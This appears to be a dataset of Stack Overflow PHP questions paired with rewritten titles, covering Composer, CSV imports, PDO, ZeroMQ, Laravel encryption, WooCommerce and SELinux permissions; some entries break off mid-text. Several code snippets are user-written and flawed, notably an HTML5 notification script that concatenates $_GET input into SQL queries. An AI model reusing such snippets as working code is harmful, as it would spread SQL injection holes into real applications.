So I tried : doing a composer selfupdateRemoving composer and re-installing itUsing composer.phar instead of the global onedoing composer dumpautoloadremoving the composer.lock fileremoving all cache composer clearcacherunning a composer update, on production (desperate)And still get the same error. Do you have any ideas ? I'm running out of keywords to find similar issues online. Thanks a lotEDIT : Also failed to mentioned that the site is working fine.. No error when browsing.EDIT 2 : As per @marcanuy suggestion, I tried removing the vendor directory. While at it I also cleared compiled and composer cache.

Ajax big data that make site slow response even when re-access to site by open another tab on same browser," I have a Silverstripe site that deals with very big data. I made an API that returns a very large dump, and I call that API at the front-end by ajax get.When ajax calling the API, it will take 10 mins for data to return (very long json data and customer accepted that). While they are waiting for the data return, they open the same site in another tab to do other things, but the site is very slow until the previous ajax request is finished.

There's a lot of data, and the data server is slow; my customer doesn't mind the request taking long, they mind how slow everything else becomes.

"How to import huge CSV file with 200,00 rows to MySQL Asynchronously and fast?"," I have to write a PHP script that will import data from a given CSV file into MySQL database. The given CSV file can contain up to 200,000 rows.I tried the following but problems arise : LOAD DATA LOCAL INFILE : I cannot use LOAD DATA LOCAL INFILE statement because I wanted to do some validations first BEFORE uploading the rows, also, our DB admin doesn't want me to use that statement and I don't know why.FOR LOOP : Inserting line by line inside FOR loop will take too much time resulting to Connection Timeout.Now, I am thinking of a solution by splitting the CSV file into smaller chunks, then inserting them asynchronously. I am already done with the splitting of CSV, but I currently have no idea how to asynchronously insert into my database for quick and safe way. But I heard that I will be using Ajax here.Any solution you can recommend? Thanks a lot in advance! <code> ","How to import huge CSV file with 200,00 rows to MySQL (asynchronous and fast)?"

mysqli_real_escape_string why not safe? - example," I know there have been a lot of questions asked already about this topic. And I also know that the way to go are prepared statements. However I have still not completely understood if or how the following could become a security problem: I tried many different inputs from a injection cheat sheet but could not find anything that passed the query. E.g. if I entered anything with an "";"" then $result became false because one query cannot contain two separate statements as far as I know. Any input having an ' or "" was sanitized by mysqli_real_escape_string. Could you please explain to me, how the code above could be exploited? If you have a link, which explains it I am more than happy to read it, too!CheersEDIT: This was answered already in this answer:SQL injection that gets around mysql_real_escape_string()This question however was about the older version of mysql but not mysqli.

HTML5 Notification With Apache Cronjob," I noticed Facebook started using the HTML5 notification for desktop and I thought I would start dabbling in it for fun for my blog. My idea is pretty simple: new blog comes out, apache cronjob runs every X minutes and calls a file, does some PHP wizardry and out goes the notification. I have looked online and found examples using node.js and angular, but I'm not comfortable using either of those so I'd rather stick with PHP. Here is my process: The user goes to my blog and will click a button to allow notifications. For brevity, the below code sends the users a notification when they click the ""notify"" button. This works perfectly, and in theory should subscribe them to any future notifications. You can see the fiddle of the above. Access to the user is granted and now I should be able to send them notifications whenever I want. Awesome! I then write up a blog entry and it has the ID of XYZ. My cronjob goes and calls the following PHP script, using the above node.js example as a template.(In this example I am just calling the script manually from my phone and watching my desktop screen. Since my desktop is ""subscribed"" to the same domain, I think the following would/should work.) I then check the database and blog entry XYZ's ""alert"" is now set to ""1"", yet my desktop browser never got notified. Since my browser is subscribed to the same URL that is pushing out the notification, I would imagine I'd get a message. Either I'm doing something wrong (perhaps PHP isn't the right language for this?), or I'm misunderstanding the spec. Could somebody help point me in the right direction? I think I'm missing something. Thanks a lot. Update 1According to the comments, if I just call a script with this in it: It should hit all devices that are subscribed to my notifications. I tried this on my phone but my desktop still didn't get a notification. I still think I'm missing something as my notifications seem stuck to one device and can only be called on page-load or on click as opposed to Facebook which sends you notifications even if the page isn't open in your browser.  <code>  if ('Notification' in window) {function notifyUser() { var title = 'example title'; var options = { body: 'example body', icon: 'example icon' }; if (Notification.permission === ""granted"") { var notification = new Notification(title, options); } else if (Notification.permission !== 'denied') { Notification.requestPermission(function (permission) { if (permission === ""granted"") { var notification = new Notification(title, options); } }); }}$('#notify').click(function() { notifyUser(); return false;});} else { //not happening} $num = $_GET['num'];$db = mysql_connect(DB_HOST, DB_USER, DB_PASS);if($db) { mysql_select_db('mydb', $db); $select = ""SELECT alert FROM blog WHERE id = "".$num."" && alert = 0 LIMIT 1""; $results = mysql_query($select) or die(mysql_error()); $output = ''; while($row = mysql_fetch_object($results)) { $output .= ""<script> var title = 'new blog!'; var options = { body: 'come read my new blog!', icon: 'same icon as before or maybe a new one!' }; var notification = new Notification(title, options); </script>""; $update = ""UPDATE blog SET alert = 1 WHERE id = "".$num."" && alert = 0 LIMIT 1""; mysql_query($update) or die(mysql_error()); } echo $output;} var title = 'new blog!'; var options = { body: 'come read my new blog!', icon: 'same icon as before or maybe a new one!' }; var notification = new Notification(title, options);",HTML5 Notification With PHP

But not with foreach(), but with updateAll(). <code>  $list = array(1, 2, 3, 4, 5);foreach($list as $id) { $query = ""UPDATE products SET photos=crawler.photos, status=crawler.status WHERE id=crawler.product_id AND crawler.product_id=$id;"";}",Updating multiple rows using Yii's updateAll()

What happend to php_mysql.dll?," Finally, after hours of strugling, I finished installing PHP 7.02 on our IIS 7.5 Windows Server 2008. All functions properly except for one error: [20-Jan-2016 15:19:26 UTC] PHP Warning: PHP Startup: Unable to load dynamic library 'D:\PHP\php-7.0.2-nts-Win32-VC14-x64\ext\php_mysql.dll' - The specified module could not be found. in Unknown on line 0When checking the downloaded zip-file op PHP 7.02 it's clear that the folder ext doesn't contain a file called php_mysql.dll.

display checkbox items list except selected dropdown item," I have dropdown list of items and a popup (used colorbox for opening popup) with a list of checkboxes. The popup is shown on click of '+Add/Edit'. Both the dropdown items and the checkboxes are generated in PHP from a complaint.csv file.complaint.csv file PHP code Question:If a Main complaint item is select then that same complaint does not appear in Additional Complaint list (i.e. if 'complaint type 1' is selected for Main complaint, 'complaint type 1' does not display on Additional Complaint list)How should I get that using one complaint.csv file like checking for the selected item, and avoid it when displaying the list e.g on select 'complaint type 1', the data from complaint.csv file will be display on popup checkbox list except 'complaint type 1' which is selected?There is empty space generating if we remove the element. I don't want the empty space of removed item in checkbox list. Empty space means if 'complaint type 2' is removed then there empty space creates between 'complaint type 1' and 'complaint type 3'. Is there any way to have AJAX for this situation like when the item is selected AJAX will call and it will remove the item from the checkbox list which is selected and then load the new items list except the selected one. (right now both list are loading at a same time on page load insted of that using AJAX the dropdown list should load on page load and checkbox list on click '+Add/Edit' button avoiding selected item.) Thus might be the empty space will not be there. How this should be done using AJAX?OR Can anyone please suggest any solution with PHP or JS to get both requirements? <code>  1,complaint type 12,complaint type 23,complaint type 3etc... <label class=""question-name"" ng-class=""{error:hasError()}""> <span class=""ng-binding"" ng-hide=""question.nameHiddenOnMobile""> Chief Complaint </span> <span class=""icon-required"" ng-show=""question.required""></span></label><select name=""Language.PrimarySpoken"" ng-hide=""showAddAnswer"" ng-model=""question.response.value"" ng-options=""a.text as a.getText() for a in question.answers.items"" id=""Language.PrimarySpoken"" ng-value=""a.text"" class=""input-wide"" ng-class=""{error:hasError()}""> <option class=""hidden"" disabled=""disabled"" value=""""></option> <?php $file_handle = fopen(""../complaint.csv"", ""r""); while (!feof($file_handle)) { $lines_of_text[] = fgetcsv($file_handle, 1024); } fclose($file_handle); foreach ( $lines_of_text as $line_of_text): ?> <option value=""<?php print $line_of_text[1]; ?>""> <?php print $line_of_text[1]; ?></option> <?php endforeach; ?> </select> <br/> <br/> <label class=""question-name"" ng-class=""{error:hasError()}""> <span class=""ng-binding"" ng-hide=""question.nameHiddenOnMobile""> Additional Complaint </span> <span class=""icon-required"" ng-show=""question.required""></span> </label> <div class=""form-row added ng-binding"" ng-bind-html=""question.getText()"" id=""text"" ></div> <div class=""form-row addlink ng-binding"" ng-bind-html=""question.getText()""> <em><a class='inline' href=""#inline_content"">+ Add/Edit</a></em> </div> <div style='display:none'> <div id='inline_content' style='padding:25px; background:#fff; font-size: 17px;'> <form action="""" id=""popup_form""> <?php // Setup --------------------------------------------------------------- define('numcols',4); // set the number of columns here $csv = array_map('str_getcsv', file('../complaint.csv')); $numcsv = count($csv); $linespercol = floor($numcsv / numcols); $remainder = ($numcsv % numcols); // Setup --------------------------------------------------------------- // The n-column table -------------------------------------------------- echo '<div class=""table"">'.PHP_EOL; echo ' <div class=""column"">'.PHP_EOL; $lines = 0; $lpc = $linespercol; if ($remainder>0) { $lpc++; $remainder--; } foreach($csv as $item) { $lines++; if ($lines>$lpc) { echo ' </div>' .

How can you change the document root request folder in http server behavior?," I'd like to know if there is a way of changing the relative document root for extra security. I'll try to explain myself through the following example: Say an www.example.com request to the web server would point to the root folder.I was wondering if there was a configuration, for instance through an .htaccess file located in said root folder, that would make the server point to the public folder instead, therefore having any remote paths always be relative to said public folder.In this instance, www.example.com/app would request an app folder inside of public, instead of an app folder inside of root, leaving the latter to be inaccessible from a remote url request.In the same manner, www.example.com/public would request a public folder inside of our root public folder and so forth. I've read various topics like this one that mention using a custom .htaccess configuration to achieve something similar, but it requires the manual configuration of the request url in said file, while my intention is for it to work without further configuration no matter where you host the application.Another possible solution I've seen is doing a hard redirect through the .htaccess file, which does not solve anything actually. Feel free to edit this post as I might have had a hard time trying to get my point across. <code>  /root /app /public",How can the document root be changed in web server behavior?

Laravel - controller calling another controller - good practice?," I was able to implement a PaypalController, with a reusable postPayment() method, which accepts items and their prices, and creates a Paypal payment, and redirects to a Paypal payment page. PaypalController is called statically by other controllers. For example, the AuthController might call it to request payment from the user right after the user registers to my site: Basically, PaypalController returns a Redirect to AuthController, which also returns it, to perform the redirect to the Paypal payment page.I was wondering if this is a good design - a controller calling a different controller, is it?If not, what would be a better way to do this? Maybe move my code from PaypalController into custom Service Provider, or custom Helper, or something else? I am very new to Laravel, and I would appreciate some guidance. <code>  class PaypalController extends Controller { private static $_api_context; private static function initialize() { //initialize api context } public static function postPayment($items, $currency, $description) { self::initialize(); //create item list, transaction, payment objects, etc $payment->create(PaypalController::$_api_context); ... return redirect()->away($redirect_url); // redirect to paypal }} class AuthController extends Controller { public function postRegister(Request $request) { return PaypalController::postPayment($items, 'JPY', 'description'); }}",Is calling a Controller From Another Controller a good practice in Laravel?

The problem is that when I create getJsonCode with a XMLHttpRequest it tells me it's not defined Is it possible to call an external file like this within a service worker or are there some kind of limitations? Because I don't get why this isn't working <code>  self.addEventListener('install', function(event) { self.skipWaiting(); console.log('Installed', event);});self.addEventListener('activate', function(event) { console.log('Activated', event);});self.addEventListener('push', function(event) { console.log('Push message', event); getJsonCode(); );})getJsonCode() { codeRequest= new XMLHttpRequest(); codeRequest.open('get', 'myfileWithJson.php', true); codeRequest.send(); dataJSON = codeRequest.responseText; console.log('rispostaJSON');}",XMLHttpRequest within service worker

how to overcome server load issues when running multiple cron jobs simultaneously," I've got a site that displays data from a game server. The game has different ""domains"" (which are actually just separate servers) that the users play on.Right now, I've got 14 cron jobs running at different intervals of the hour every 6 hours. All 14 files that are run are pretty much the same, and each takes around 75 minutes ( an hour and 15 minutes ) to complete it's run.I had thought about just using 1 file run from cron and looping through each server, but this would just cause that one file run for 18 hours or so. My current VPS is set to only allow 1 vCPU, so I'm trying to accomplish things and stay within my allotted server load.Seeing that the site needs to have updated data available every 6 hours, this isn't doable.I started looking into message queues and passing some information to a background process that will perform the work in question. I started off trying to use resque and php-resque, but my background worker died as soon as it was started. So, I moved on to ZeroMQ, which seems to be more what I need, anyway.I've set up ZMQ via Composer, and everything during the installation went fine. In my worker script (which will be called by cron every 6 hours), I've got: $filesToUse is an array of files submitted by users that contain information to be used in querying the game server. As you can see, I'm looping through the array and sending each file to the ZeroMQ listener file, which contains: Then, in the final listener file: When the worker script is run from cron, I get no confirmation text in my log.Q1) is this the most efficient way to do what I'm trying to?Q2) am I trying to use or implement ZeroMQ incorrectly, here?And, as it would seem, using cron to call 14 files simultaneously is causing the load to far exceed the allotment. I know I could probably just set the jobs to run at different times throughout the day, but if at all possible, I would like to keep all updates on the same schedule.UPDATE:I have since gone ahead and upgraded my VPS to 2 CPU cores, so the load aspect of the question isn't really all that relevant anymore.The code above has also been changed to the current setup.I am, after the code-update, getting an email from cron now with the error:Fatal error: Uncaught exception 'ZMQSocketException' with message 'Failed to bind the ZMQ: Address already in use' <code>  $dataContext = new ZMQContext();$dataDispatch = new ZMQSocket($dataContext, ZMQ::SOCKET_PUSH);$dataDispatch->bind(""tcp://*:50557"");$dataDispatch->send(0);foreach($filesToUse as $filePath){ $dataDispatch->send($filePath); sleep(1);}$filesToUse = array();$blockDirs = array_filter(glob('mapBlocks/*'), 'is_dir');foreach($blockDirs as $k => $blockDir){ $files = glob($rootPath.$blockDir.'/*.json'); $key = array_rand($files); $filesToUse[] = $files[$key];}$mapContext = new ZMQContext();$mapDispatch = new ZMQSocket($mapContext, ZMQ::SOCKET_PUSH);$mapDispatch->bind(""tcp://*:50558"");$mapDispatch->send(0);foreach($filesToUse as $blockPath){ $mapDispatch->send($blockPath); sleep(1);} $startTime = time();$context = new ZMQContext();$receiver = new ZMQSocket($context, ZMQ::SOCKET_PULL);$receiver->connect(""tcp://*:50557"");$sender = new ZMQSocket($context, ZMQ::SOCKET_PUSH);$sender->connect(""tcp://*:50559"");while(true){ $file = $receiver->recv(); // -------------------------------------------------- do all work here // ... ~ 75:00 [min] DATA PROCESSING SECTION foreach .recv()-ed WORK-UNIT // ---------------------------------------------------------------------- $endTime = time(); $totalTime = $endTime - $startTime; $sender->send('Processing of domain '.listener::$domain.' competed on '.date('M-j-y', $endTime).' in '.$totalTime.' seconds.');} $context = new ZMQContext();$receiver = new ZMQSocket($context, ZMQ::SOCKET_PULL);$receiver->bind(""tcp://*:50559"");while(true){ $log = fopen($rootPath.'logs/sink_'.date('F-jS-Y_h-i-A').'.txt', 'a'); fwrite($log, $receiver->recv()); fclose($log);}",How to overcome server load issues when running multiple cron jobs simultaneously?

How to create a fake file?," I am trying to create a ""virtual"" file without using either memory or a temporary file. The ""virtual"" file needs to pass a check made with file_exists() while not throwing any error or warning when used with require or include. Allows you to implement your own protocol handlers and streams for use with all the other filesystem functions (such as fopen(), fread() etc.).where file_exists() is one of them. The docs page states: As of PHP 5.0.0, this function can also be used with some URL wrappers. Refer to Supported Protocols and Wrappers to determine which wrappers support stat() family of functionality.My attempt there was to build a custom, virtual file wrapper While the fstat() function executes the method, file_exists() does not execute any stream class method.How could I get a virtual stream wrapper to work (with file_exists())?I am fully aware that tempnam( __DIR__, '' ) will pass both:var_dump( tempnam( __DIR__, '' ) ); Returns truerequire tempnam( __DIR__, '' ); No errorbut I do not want to use a temporary file as there might be a better way (performance wise). <code>  class VirtualFileWrapper{ public $context; public function stream_open( $path, $mode, $options, &$opened_path ) { return TRUE; } public function stream_stat() { var_dump( __METHOD__ ); $data = [ 'dev' => 0, 'ino' => getmyinode(), 'mode' => 'r', 'nlink' => 0, 'uid' => getmyuid(), 'gid' => getmygid(), 'rdev' => 0, 'size' => 0, 'atime' => time(), 'mtime' => getlastmod(), 'ctime' => FALSE, 'blksize' => 0, 'blocks' => 0, ]; return array_merge( array_values( $data ), $data ); }}stream_wrapper_register( 'virtual', 'VirtualFileWrapper' );$file = fopen( ""virtual://foo"", 'r+' );// Executes VirtualFileWrapper::stream_stat()fstat( $file );// Executes no VirtualFileWrapper methodfile_exists( $file );","How to create a fake / ""virtual"" file?"

php why does the function signature differ between array_map and array_filter/array_reduce," array_map asks for the $array input as the last parameter(s). array_filter and array_reduce take $array input as the first parameter. As a contrasting example, when you call map, filter or reduce on an array in JavaScript, the callback function signatures look like Array.prototype.reduce takes the carryover value as the first parameter, but it is still impossible to mix up the parameters' order in the JavaScript methods. I know that PHP isn't functionally-oriented, but I'm wondering what the design decisions were leading to the signatures for array_map etc. Does array_map take an array as the last parameter simply because you can feed as many arrays as you want (variadic)? Does the ability to feed an arbitrary number of arrays through the callback function of array_map outweigh having more uniform function signatures? EDIT/ Comment:from Wikipedia, this puts in perspective just how long PHP has been evolving: 'Early PHP was not intended to be a new programming language, and grew organically, with Lerdorf noting in retrospect: ""I dont know how to stop it, there was never any intent to write a programming language [] I have absolutely no idea how to write a programming language, I just kept adding the next logical step on the way."" A development team began to form and, after months of work and beta testing, officially released PHP/FI 2 in November 1997. The fact that PHP was not originally designed but instead was developed organically has led to inconsistent naming of functions and inconsistent ordering of their parameters. In some cases, the function names were chosen to match the lower-level libraries which PHP was ""wrapping"", while in some very early versions of PHP the length of the function names was used internally as a hash function, so names were chosen to improve the distribution of hash values.' <code>  (current, index, array) => {}",Why does the function signature differ between array_map and array_filter/array_reduce?

PDO inTransaction returning false after database exception," PDO's inTransaction() is returning false while still in a transaction if a database exception is thrown. This is probably specific to using PostgreSQL. e.g. The transaction has definitely not ended because if I start another one I get an exception that there is already a transaction in progress. I haven't tested every type of exception, but it's definitely happening for SQLSTATE[40001]: Serialization failure and primary key violations. Is this expected behavior or is it a bug in PHP?It seems the only way to know to rollback is to keep a separate variable to know I'm in a transaction, making inTransaction() useless. I've noticed that some open source frameworks (like Doctrine) and applications (like Drupal) keep their own variable for transaction state. Why can't we rely on the driver or database to tell us if a transaction is in progress?PHP 5.5.32 and PostgreSQL 9.4.

I came upon storing my Laravel project here in GitHub, but there's a problem every time I will clone it to be able to go to production, when I'm about to clone it at first, it always shows this error.

"After moving the Wordpress, login works, but no admin anymore"," After transferring a wordpress from an old ISP to a new ISP, I have trouble with the admin access / access to the dashboard. The transfer was done by copying all files (incl. .htaccess) from the old server to the new server, dumping the old DB and putting it on the new server and adjust all settings for DB in wp-config.php. By setting a hosts entry on my machine, I could verify that everything is working fine and all content appears. Here is my problem. After logging in thru wp-login.php with old and new credentials (manually added admin account for example) the login is happening, redirecting me to the website, stating successful login by the login bar on the top of the page, but access to the dashboard is prohibited by stating. The login bar also has nearly no options except of going to wordpress.com or logout. This is probably just a small thing and I just need someone that points me into the right direction.  <code>  Sorry, you are not allowed to access this page.","After moving Wordpress, login works, but no admin access anymore"

Many uses of one placeholder in MySQL prepared statement," I'm using PHP, and MySQL with PDO. Sometimes I need to prepare a statement with one variable (placeholder) used more than once in this query.Example: However if I will try to prepare this statement I will have an error so I need to do this in a way like this: To call this statement I will need to have an array like this: It looks so stupid for me! Why MySQL (PDO?) don't allowing me to use one place holder more than once and forcing me to use extra variables which requires more control?!This can be handled easy if the query is relatively simple (like I posted above), but now I built a query with 5 (!!!) uses of single variable. Each time I add the placeholder I need to check the code in many places to make it OK.Is there any setting or a tweak to bypass this? <code>  SELECT * FROM messages WHERE from_id = :user OR to_id = :user SELECT * FROM messages WHERE from_id = :user1 OR to_id = :user2 array('user1'=>$user_id, 'user2'=>$user_id);",Why PDO doesn't allow multiple placeholders with the same name?

UPS Shipment Tutorial (PHP)," I finally managed to set up an UPS shipment XML request and I would like to share it with other people struggling with it. So here is a complete PHP object oriented valid XML according to newest documentation from 2017. Im doing this because there are not many helpful information on the internet and I want to change that.This code also solves many common errors about which you can find questions here on StackOverflow but mostly without answers. This is not a question, its a tutorial for those who will be doing UPS Shipments in the future.I have managed to solve these common UPS errors with my code: The XML document is not well formed -> This error was a bit tricky because I have checked my XML structure thousand times and I had it 100% the same as the documentation said BUT I had an OLD DOCUMENTATION so few things got changed so when I recreated the structure to the newest one the problem was solved. The XML document is well formed but the document is not valid -> I really dont know what the hell was causing this error but changing the ""sending logic"" a little bit solved it (you can take a look at the end of XML structure how its done).After I solved these two ""biggest"" errors UPS Requests started to work and the proper error messages were coming saying more details about whats wrong... for example ""AccessLicenseNumber invalid"" and so on So the first thing you should do is to register on UPS Website and download newest documentation from there.Note: This code sends first request called ""ConfirmRequest"" which will get a response ""ConfirmResponse"" and second request called ""AcceptRequest"" which results in ""AcceptResponse"" according to image below! <code> ",UPS Shipping Tutorial (PHP)

Laravel 5.4 use multiple error messages for the same custom validation rule," In order to reuse code, I created my own validator rule in a file named ValidatorServiceProvider : And I use this rule like this : But, I want to set different error messages for each case, something like this : But I don't figure out how to achieve this without doing 2 different rules ...Of course it could work with multiple rules but it will also perform multiple SQL queries, and I really want to avoid that.Also, keep in mind that in real case I could have more than 2 validations like theses in a single rule.Does anyone have an idea ?=====EDIT 1 :Actually, I think that I want something that works in a similar way to the between or size rules.They represent one single rule, but provide multiple error messages : Laravel checks if the value represents a numeric, a file, a string or an array ; and gets the right error message to use.How do we achieve this kind of thing with custom rule ? <code>  class ValidatorServiceProvider extends ServiceProvider{ public function boot() { Validator::extend('checkEmailPresenceAndValidity', function ($attribute, $value, $parameters, $validator) { $user = User::where('email', $value)->first(); // Email has not been found if (! $user) { return false; } // Email has not been validated if (! $user->valid_email) { return false; } return true; }); } public function register() { // }} public function rules(){ return [ 'email' => 'bail|required|checkEmailPresenceAndValidity' ];} if (! $user) { $WHATEVER_INST->error_message = 'email not found'; return false;} if (! $user->valid_email) { $WHATEVER_INST->error_message = 'invalid email'; return false;} 'size' => [ 'numeric' => 'The :attribute must be :size.', 'file' => 'The :attribute must be :size kilobytes.', 'string' => 'The :attribute must be :size characters.', 'array' => 'The :attribute must contain :size items.',],",Laravel 5.4 - How to use multiple error messages for the same custom validation rule

How to handle fatal GD exceptions?," When I'm trying use php-gd functions on incorrect png images, I have Fatal PHP error.

performence tips for finding unique permutation," TLDR:how to find multidimensional array permutation in php and how to optimize for bigger arrays?This is continuation of this question:how to find multidimensional array permutation in phpwe have script for sorting array, idea is to find unique permutation of array, rules to find this permutation are: Input array contains set of arrays. Each inner array contains unique elements. Each inner array may have different length and different values. Output array must contain exact same values. Output inner array must have unique values on same key. If there is no solution, wildcard ie.: null are allowed. Wildcards can be duplicated on same key. Solution should have as few wildcards as possible. Algorithm should be able to handle array up to 30x30 in less than 180 s. i have this solution so far: And this works perfectly on small array, but trouble is this iterating over all possibilities of array movements, and for array like 6x6 this is just too much to compute - O(nn) in both time and space! <code>  function matrix_is_solved(array $matrix) { foreach (array_keys(current($matrix)) as $offset) { $column = array_filter($raw = array_column($matrix, $offset)); if (count($column) != count(array_unique($column))) return false; } return true;}function matrix_generate_vectors(array $matrix) { $vectors = []; $columns = count(current($matrix)); $gen = function ($depth=0, $combo='') use (&$gen, &$vectors, $columns) { if ($depth < $columns) for ($i = 0; $i < $columns; $i++) $gen($depth + 1, $i . $combo); else $vectors[] = array_map('intval', str_split($combo)); }; $gen(); return $vectors;}function matrix_rotate(array $matrix, array $vector) { foreach ($matrix as $row => &$values) { array_rotate($values, $vector[$row]); } return $matrix;}function matrix_brute_solve(array $matrix) { matrix_make_square($matrix); foreach (matrix_generate_vectors($matrix) as $vector) { $attempt = matrix_rotate($matrix, $vector); if (matrix_is_solved($attempt)) return matrix_display($attempt); } echo 'No solution';}function array_rotate(array &$array, $offset) { foreach (array_slice($array, 0, $offset) as $key => $val) { unset($array[$key]); $array[$key] = $val; } $array = array_values($array);}function matrix_display(array $matrix = null) { echo ""[\n""; foreach ($matrix as $row => $inner) { echo "" $row => ['"" . implode(""', '"", $inner) .

Returning HTML instead of JSON," I have a question connected with JSON and PHP. So, if you visit this site: http://air.moepp.gov.mk/graphs/site/pages/MakeGraph.php?station=SkopjeRegion&parameter=PM10D&beginDate=2018-02-10&beginTime=19:00&endDate=2018-02-17&endTime=19:00&i=1518893212453&lang=enAs a return you get HTML, but if you go to the response, the response is pure JSON, so I'm trying to get the JSON data, but I fail. Probably I'm doing something wrong, but I don't know what. I tried with file_get_contents() and curl but I don't get anything from it... So here is what I'm trying to do: And as return I get NULL.Edit:I figured out that my PHP function file_get_contents() is not properly working because of the problem with the permission. The problem was:file_get_contents('url'): failed to open stream: Permission denied in /var/www/html/xxx.php on line XAfter googling, and suggestion from @geoidesic, I found out that SELinux (Security Enhanced Linux) is blocking Apache (by default network connection from httpd (Apache) is disabled. So i followed step-by-step tutorial on http://drib.tech/programming/php-file_get_contents-not-working and finally got it to work. Anyways, here is the solution in short if someone needs it:Be sure you have allow_url_fopen=On in your php.ini file. (If someone doesn't know where your php.ini file is, quick check with phpinfo() could get you everything.Check status of SELinux:sudo sestatusIf the status is enabled , then you can check whether the boolean flags httpd_can_network_connect and httpd_unified are enabled, set to 1:sudo sestatus -b | grep httpd_can_network_connect and sudo sestatus -b | grep httpd_unifiedIf they're off, run this command to set them on:sudo setsebool -P httpd_can_network_connect 1 sudo setsebool -P httpd_unified 1And then reboot, or restart httpd. So that's all, again, thanks a lot to the guy/s at drib.tech. <code>  <?php$content = file_get_contents('http://air.moepp.gov.mk/graphs/site/pages/MakeGraph.php?station=SkopjeRegion&parameter=PM10D&beginDate=2018-02-10&beginTime=12:00&endDate=2018-02-17&endTime=12:00&i=1518865590001&lang=en'); $contents = json_decode($content, true); var_dump($contents);",Fixing error with file_get_contents permission denied

how to use Ratchet\Server\IoServer object after run executed?," I want to run a function that iterates through a generator class.

Woocommerce hide checkout fields based on chosen shipping," I was previously using this answer to hide checkout fields based on chosen shipping method, it worked fine until an update (3.4.2 current version) I think not sure what has changed but it doesn't work as intended anymore.Previously when local pickup was chosen some fields were hidden and made optional and when delivery was chosen it would show those fields again all via dynamically without reloading the page.

Eloquent relationship between one Model and Many Models as MorphOne?," Introduction:I have these Tables with their Models:addresses table --> Address modelusers table --> User modelcompanies table --> Company modelproperties table --> Property modelRules:each User can have one address only.each Company can have one address only.each Property can have one address only.Two possible relationships planning could be done here:User hasOne Address and Address belongsTo User [i.e. one-to-one relationship] but the disadvantage is that the foreign key here is located in addresses table i.e. user_id field and by repeating the same relationship with other models [Company and Property] we will get another two foreign keys in the addresses table which are [company_id and property_id], then we will end up with 3 foreign keys for 3 Models But only one will be filled by each row record leaving always two foreign keys fields left emptyI feel this is an overhead charge to addresses table.OR the other way around:Address hasOne User and User belongsTo Address [one-to-one relationship also]. This has the advantage that it keeps the foreign key here in the related Model i.e. [User, Company and Property] this way there is no empty fields of foreign keys --- But still this is against the real life Modelling logic which dictates that User hasOne Address more than Address hasOne User.My Question:Is there any other relationship that can bind these 4 Models in one relationship similar to Polymorphic Relations but without using MorphMany but instead using MorphOne which strangely enough, I can not find it in the Documentation of Laravel although the method itself exists in Eloquent Relations.Is this MorphOne polymorphic relation possible and how it is composed?Existing code: <code>  //Address modelpublic function user(){ return $this->hasOne(User::class);}public function company(){ return $this->hasOne(Company::class);}public function property(){ return $this->hasOne(Property::class);}//User modelpublic function address(){ return $this->belongsTo(Address::class);}//Company modelpublic function address(){ return $this->belongsTo(Address::class);}//Property modelpublic function address(){ return $this->belongsTo(Address::class);}",Laravel Eloquent relationship between one Model and Many Models as MorphOne?
"Why the user needs to go back to step 2 and click again ""Next"" for the created reference appear?"," I have a form for a user register in a conference. But when the user clicks in ""Store Registration"" it shows an undefined offset error and the issue should be because I'm not organizing correctly this context. The form to register in a conference is different depending on if the ""all_participants"" column of the conferences table is ""1"" or ""0"". If all_participants is 1 in the conferences tableIf the conferences table has the column ""all_participants"" with value ""1"" that means that is necessary to collect the name and surname of each participant (about each selected registration type). So the form will show form fields to collect the name and surname of each participant. Also if some of the selected registration type(s) have custom questions associated is necessary to collect the answers to that questions for each participant if ""all_participants"" is 1. In the image above the registration type ""General"" has a custom question associated ""Phone"", so its necessary to collect the answers of the two participants there are being registered with the registration type ""General"".Image that shows the form of all_participants as ""1"" in the conferences tableAfter the user click in ""Store Registration"" it should be stored in the tables like below:If all_participants is 0 in the conferences tableIf ""all_participants"" is ""0"" the form would have only one field ""Phone"" because the name and surname are got directly from the authenticated user info. And because ""all_participants"" is ""0"" is only necessary also to collect the phone of the user that is doing the registration (the authenticated user), for the other participants is not necessary because ""all_participants"" is ""0"". So the form if ""all_participants"" is ""0"" would have only one field (Phone) in this case.

The Nusoap version is the 0.9.5 aswell in this server. When I var_dump() the content response this response: If the file is bigger than 6-8M will be false the $response but if the file is less than 6-8M is not a problem.So, I can say that the webservice works good in files with less size than 6-8M.Any idea about why I'm not getting the answer?I were testing to reduce the same pdf from 9M to 6M and works good, so it must be something about the size of the file. In my case seems to start to work bad at 7-9M. <code>  /** * @param string $docId * @return string */public function getDocumentFromDocId(string $docId){ $client = new \nusoap_client('http://'.$this->ip.'/arcdoc/WebServiceServer.php?wsdl', true); $response = $client->call('GetDoc', array( 'xxxx1' => 'xxxxxx', 'xxxx2' => base64_encode('xxxxx'), 'xxxx3' => base64_encode(""yyyyyyy""), 'xxxx4' => base64_encode($docId) )); var_dump($response); return $response;} /var/www/html/project/src/AppBundle/Service/whatever.php:55:boolean false",Weird behaviour receiving a pdf content from a webservice nusoap

How to calculate the maximum length of the output of the Laravel encyption method?," SetupGiven the following: Is is possible to know, for a string of length 1, the possible range of lengths of $s? ContextDatabase storage - need to store an encrypted value, and would like to set validation of the input string so the longest length input string, when encrypted, is inserted into the db without truncation. Basic testsRunning some very crude tests locally, using the following snippet: I can see the following, but it varies between runs, for example, a string of 'a' will be of length of either 188 or 192 (longer values seem to be between 244 and 248). So there must be a formula. I have seen output_size = input_size + (16 - (input_size % 16)) but doesn't account for the variance. Output EditOk, so after chatting with @Luke Joshua Park below, the variance in length comes from the laravel encryption function and the way $iv is created, which is random bytes, which can contain /. $value inside the encryption method can also contain a /. When values that contain a / are JSON encoded, the / is escaped to \\\/ adding an additional 3 characters per occurrence. The real problem - can $iv and $value contain more than a single '/'?  <code>  $s = Crypt::encryptString('a'); Route::get('/test', function() { echo '<table>'; for ($i=0; $i < 100; $i++) { $s = str_repeat('a', $i); $l1 = strlen($s); $l2 = strlen(Crypt::encryptString($s)); echo ""<tr><td>$l1</td><td>$l2</td></tr>""; } echo '</table>';}); 0 1921 1882 1883 1924 1885 1886 1887 1928 1929 18810 18811 19212 19213 19214 19215 19216 22017 22018 21619 21620 220",How to calculate the maximum length of the output of the Laravel encryption method?
Custom Woocommerce Product Page Admin Checkbox To Hide Add To Cart Button," I would like to add a custom check box to the woocommerce product page back end that hides the Add To Cart button in the front end.

